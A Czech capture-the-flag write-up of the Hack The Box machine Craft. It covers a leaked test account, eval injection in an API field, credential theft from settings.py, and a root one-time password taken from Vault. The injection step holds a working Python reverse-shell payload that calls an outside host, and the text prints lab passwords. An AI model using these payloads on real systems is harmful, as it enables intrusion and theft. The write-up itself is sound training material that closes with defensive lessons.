## Úvod a kontext

Craft kombinuje API chybu, uniklé vývojové credentialy a špatně navržený provozní přístup k Vaultu. První shell zde nevzniká brute forcem ani slabou webovou autentizací, ale přes testovací účet `dinesh`, který zůstal v kódu, a nebezpečné vyhodnocení pole `abv` v backendu. První půlka tedy dobře navazuje na článek [Repozitář, historie konfigurace a deployment trust](/techniky/repozitar-historie-konfigurace-a-deployment-trust).

Druhá půlka je stejně důležitá. Shell v aplikaci ještě neznamená root na hostu. Teprve tajemství v `settings.py`, přístup k účtu `gilfoyle` a možnost vyžádat si z Vaultu jednorázové root OTP ukazují, jak snadno se provozní automatizace může změnit v plný kompromis serveru. Obecněji tenhle vzorec shrnuji i v článku [Údržbové skripty a provozní automaty jako zdroj přístupů](/techniky/udrzbove-skripty-a-provozni-automaty-jako-zdroj-pristupu).

## Analýza zjištění

### Testovací účet do `api.craft.htb`

Ve zdrojáku zůstal test, který se přihlašuje jako `dinesh` a rovnou vypisuje API token. To okamžitě ukazuje, že vývojové credentialy přežily do produkčního prostředí. Není to chyba "jen v jednom testu", ale v tom, že repozitář a produkční důvěra sdílejí stejná tajemství.
```text
commit test: +response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
token: __CENSORED__
```

### `eval` v poli `abv`

Jakmile účet `dinesh` vrátí platný token, stojí za to zkusit, jak backend validuje pole jednotlivých brew záznamů. Ukáže se, že `abv` neprochází bezpečným parsováním, ale nebezpečným `eval`. To z čistého API requestu udělá přímo RCE.
```python
a = '''eval(compile("""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.149",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""",'PyCodeInjectionShell','single'))'''
brew_dict['abv'] = a
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
```

## Získání přístupu

### Shell v aplikaci a údaje z `settings.py`

První shell běží v aplikačním kontextu. Právě tam má smysl číst `settings.py`, protože v ní leží jak `CRAFT_API_SECRET`, tak databázové credentialy `craft:qLGockJ6G2J75O`. Přes přímý dotaz do databáze pak lze vypsat i hesla dalších uživatelů, mimo jiné `gilfoyle`.
```bash
cat settings.py
```
```python
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
```

```bash
./test.py
```
```text
((1, 'dinesh', '4aUh0A8PbVJxgd'), (4, 'ebachman', 'llJ77D8QFkLPQB'), (5, 'gilfoyle', 'ZEU3N8WNM2rh4T'))
```

### Přechod na `gilfoyle` přes SSH

Jakmile je k dispozici heslo `gilfoyle` a odpovídající soukromý klíč `Craft-id_rsa`, SSH je přirozený další krok. Oproti aplikačnímu shellu dovolí čistší lokální enumeraci hostu.
```bash
ssh -i Craft-id_rsa gilfoyle@$IP              # heslo: ZEU3N8WNM2rh4T
```

### Získání user flagu

`user.txt` potvrzuje, že API kompromitace už vedla z kontejnerového nebo aplikačního kontextu na skutečný uživatelský účet hostu.
```text
cat user.txt
bbf4b0cadfa3d4e6d0914c9cd5a612d4

./lse.sh -l2

VAULT_ADDR=https://vault.craft.htb:8200/
```

## Eskalace oprávnění

### Vault helper a jednorázové root OTP

Lokální průzkum pod `gilfoyle` ukáže `VAULT_ADDR=https://vault.craft.htb:8200/` a přítomnost `vault-ssh-helper`. To je zásadní stopa: host je napojený na Vault SSH backend a může si ověřovat jednorázová hesla. Pokud má uživatel možnost vyžádat si OTP pro `root`, nepotřebuje další exploit. Tady se provozní automatizace sama mění v privilegovaný přístupový kanál.
```bash
vault-ssh-helper -verify-only -config=/usr/local/etc/vault-ssh-helper.hcl
vault write ssh/creds/root_otp ip=10.10.10.110
ssh root@10.10.10.110
cat root.txt
```
```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- První foothold stál na testovacím účtu `dinesh` a `eval` v poli `abv`, které změnilo obyčejný API request v RCE.
- Přechod na stabilní shell otevřely tajemství v `settings.py` a databázové credentialy, z nichž šlo získat heslo účtu `gilfoyle`.
- Root nevznikl z další zranitelnosti v aplikaci, ale z provozního napojení hostu na Vault přes SSH OTP.

## Co si odnést do praxe

- Testovací credentialy a integrační skripty nesmějí zůstat v produkčním kódu. Na Craft právě starý test s účtem `dinesh` otevřel celý útok ještě před hledáním hlubších slabin.
- Vstupy do backendu se nesmějí validovat přes `eval` nebo podobné dynamické vyhodnocení. Jakmile API přijímá hodnotu, kterou server interpretuje jako kód, je RCE prakticky nevyhnutelné.
- Napojení na Vault nebo jiný secrets backend musí být svázané s přísnými politikami. Možnost vyžádat si root OTP z běžného uživatelského účtu je ve výsledku totéž jako přímý root shell.
